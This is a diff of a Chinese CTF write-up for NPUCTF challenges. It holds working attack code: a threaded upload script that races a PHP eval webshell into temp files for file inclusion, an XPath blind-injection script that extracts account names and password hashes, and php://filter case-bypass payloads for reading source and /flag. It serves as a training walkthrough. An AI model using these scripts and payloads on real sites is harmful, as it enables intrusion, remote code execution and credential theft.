@@ -1,10 +1,11 @@
 ---
-title: ha1cyon-ctf
+title: NPUCTF
 date: 2020-04-19 20:52:53
 updated: 2020-04-19 20:52:53
 tags:
- - 日常水题
- - 待补充
+ - NPUCTF
+ - xpath注入
+ - 利用文件包含+php临时缓存拿shell
 categories:
  - 刷题记录
 ---
@@ -14,6 +15,8 @@ categories:
 ## 验证🐎
 
 给了源码
+
+<!--more-->
 
 ```js
 const express = require('express');
@@ -323,13 +326,225 @@ username/password error<html>
 </html>
 ```
 
+抓包发现cookie里面有一个hash，直接提交即可。
 
+目录扫描发现了一个dir.php。
+
+提交之后来到了/flflflflag.php，然后立马跳转到404.html。
+
+```html
+<html>
+<head>
+<script language="javascript" type="text/javascript">
+           window.location.href="404.html";
+</script>
+<title>this_is_not_fl4g_and_出题人_wants_girlfriend</title>
+</head>
+<>
+<body>
+include($_GET["file"])</body>
+</html>
+```
+
+利用文件包含查看源码
+
+```php+HTML
+///flflflflag.php
+html>
+<head>
+<script language="javascript" type="text/javascript">
+           window.location.href="404.html";
+</script>
+<title>this_is_not_fl4g_and_出题人_wants_girlfriend</title>
+</head>
+<>
+<body>
+<?php
+$file=$_GET['file'];
+if(preg_match('/data|input|zip/is',$file)){
+	die('nonono');
+}
+@include($file);
+echo 'include($_GET["file"])';
+?>
+</body>
+</html>
+```
+
+经过一番查找后，考点是这个[PHP临时文件机制与利用的思考](https://www.anquanke.com/post/id/183046)
+
+利用[Mote](https://www.anquanke.com/member/144041)师傅github中的脚本[poc1](https://github.com/Mote-Z/PHP-Is-The-Best/blob/master/PHP_Tempfile_Exploit/POC1/upload.py),
+
+```python
+import requests
+import time
+import threading
+
+s = requests.session()
+url = 'http://fa1203f5-0c7d-4e2f-8674-c614670aa93f.node3.buuoj.cn/flflflflag.php?file=flflflflag.php'
+files = {'file' + str(i): ('webshell', '@<?php @eval($_GET[1]);?>' + 'test' + str(i), 'text/php') for i in range(20)}
+header = {
+    'Pragma': 'no-cache',
+    'Cache-Control': 'no-cache',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
+    'Connection': 'close'
+}
+
+
+def upload_file():
+    try:
+        while 1:
+            r = s.post(url=url, headers=header, files=files)
+    except requests.exceptions.ConnectionError:
+        print('Connection Error')
+        time.sleep(5)
+
+
+def main():
+    workers = []
+    for t in range(50):
+        worker = threading.Thread(target=upload_file, args=())
+        worker.start()
+        workers.append(worker)
+    for worker in workers:
+        worker.join()
+
+
+if __name__ == '__main__':
+    main()
+```
+
+一直跑，然后在dir.php查看目录文件，再包含shell进去。
+
+![](/pic/166.png)
+
+```
+payload:/flflflflag.php?file=/tmp/phpylUNtT&1=phpinfo();
+```
+
+发现flag在phpinfo中。
+
+![](/pic/166.png)
 
 ## ezlogin
 
+打开题目，是一个登陆框，随意发送数据后抓包发现传入的数据是xml格式的，猜测是xpath注入。[参考链接](![2C4905CA-9A1B-41E2-B904-8CBBEFC02962](/Users/sx/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/209124513/QQ/Temp.db/2C4905CA-9A1B-41E2-B904-8CBBEFC02962.png))
+
+![](/pic/164.png)
+
+于是尝试xpath注入万能密码,失败。尝试盲注。发现只能提交一次数据就要刷新。
+
+当语句执行正确时（`' or count(/)=1 or '1`），提示非法操作
+
+![](/pic/165.png)
+
+当语句错误时（`' or count(/)=2 or '1`）,提示账号或密码错误。
+
+编写盲注脚本
+
+```python
+import requests
+import re
+import string
+
+se = requests.session()
 
 
+def get(payload):
+    pattern = 'id="token" value="(.*?)" />'
+    url = 'http://94b8372f-c5d8-4348-afa2-522c9b88f1d8.node3.buuoj.cn/login.php'
+    headers = {'Content-Type': 'application/xml'}
+    username = payload
+    password = '123'
+    data = "<username>" + username + "</username><password>" + password + "</password><token>" + \
+           re.findall(pattern, se.get(url).text)[0] + "</token>"
+    # print(data)
+    html = se.post(url, headers=headers, data=data)
+    # print(html.text)
+    return html
 
+
+def search(s_payload, len=999):
+    result = ''
+    x = 1
+    error = 0
+    while x <= len:
+        dic = string.printable
+        for s in dic:
+            if 'text()' in s_payload:
+                payload = "' or substring(%s,%d,1)='%s' or '1" % (s_payload, x, s)
+            else:
+                payload = "' or substring(name(%s),%d,1)='%s' or '1" % (s_payload, x, s)
+            # payload = "' or substring(name(%s), %d, 1)='%s' or '1" % (s_payload, x, s)
+            res = get(payload)
+            if res.status_code == 404 or res.status_code == 429:
+                x = x - 1
+                error = 1
+                break
+            html = res.text
+            if '非法操作' in html:
+                break
+        if error == 0:
+            result += s
+            print(result)
+        x = x + 1
+    return result
+
+
+def get_root():
+    s_payload = "/*[1]"
+    root = search(s_payload)
+    print(root)
+
+
+def self_define(strs):
+    s_payload = '%s' % strs
+    tables = search(s_payload)
+
+
+if __name__ == '__main__':
+    # get_root()  #root
+
+    # self_define("/root/*[1]")  #accounts
+
+    # self_define("/root/accounts/*[1]") # user
+
+    # self_define("/root/accounts/*[1]/*[1]")  #id
+    # self_define("/root/accounts/*[1]/*[2]")  #usernmae
+    # self_define("/root/accounts/*[1]/*[3]")  #password
+
+    # self_define("/root/*[1]/*[1]/*[2]/text()") #guest
+    # self_define("/root/*[1]/*[1]/*[3]/text()")  #e10adc3949ba59abbe56e057f20f883e
+
+    # self_define("/root/*[1]/*[2]/*[2]/text()")  #adm1n
+    self_define("/root/*[1]/*[2]/*[3]/text()")  #cf7414b5bdb2e65ee43083f4ddbc4d9f
+```
+
+将密码解码得到 guest/123456. Adm1n/gtfly123
+
+发现链接是
+
+```
+?file=welcome
+```
+
+常见的文件包含形式,读取welcom源码，发现过滤了php,base，大写绕过即可
+
+```
+payload：?file=Php://filter/convert.Base64-encode/resource=welcome
+```
+
+得到提示，flag is  in /flag
+
+读取flag
+
+```
+payload：?file=Php://filter/convert.Base64-encode/resource=/flag
+```
 
 
 
